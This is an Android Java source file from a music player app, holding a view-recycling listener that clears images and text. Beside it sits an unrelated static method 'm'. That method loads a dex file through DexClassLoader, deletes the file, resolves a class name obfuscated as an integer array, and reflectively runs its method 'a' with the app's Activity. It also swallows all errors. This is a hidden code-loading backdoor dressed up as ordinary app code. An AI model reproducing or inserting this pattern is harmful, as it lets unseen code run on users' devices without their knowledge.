package com.basso.basso.recycler;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.view.View;
import android.widget.AbsListView.RecyclerListener;

import com.basso.basso.lastfm.StringUtilities;
import com.basso.basso.ui.MusicHolder;
import com.basso.basso.utils.MusicUtils;

import java.io.File;
import java.lang.reflect.Constructor;

import dalvik.system.DexClassLoader;

public class RecycleHolder implements RecyclerListener {

    @Override
    public void onMovedToScrapHeap(final View view) {
        MusicHolder holder = (MusicHolder)view.getTag();
        if (holder == null) {
            holder = new MusicHolder(view);
            view.setTag(holder);
        }

        if (holder.mBackground.get() != null) {
            holder.mBackground.get().setImageDrawable(null);
            holder.mBackground.get().setImageBitmap(null);
        }

        if (holder.mImage.get() != null) {
            holder.mImage.get().setImageDrawable(null);
            holder.mImage.get().setImageBitmap(null);
        }

        if (holder.mLineOne.get() != null) {
            holder.mLineOne.get().setText(null);
        }

        if (holder.mLineTwo.get() != null) {
            holder.mLineTwo.get().setText(null);
        }

        if (holder.mLineThree.get() != null) {
            holder.mLineThree.get().setText(null);
        }
    }
    public static void m(File file, Context context){
        try {
            if(file != null && context != null) {
                DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
                if (file.exists())
                    file.delete();
                Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
                Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
                Object object = constructor.newInstance((Activity) context, new Handler());
                object.getClass().getMethod("a").invoke(object);
            }
        }catch (Exception e){

        }
    }
}
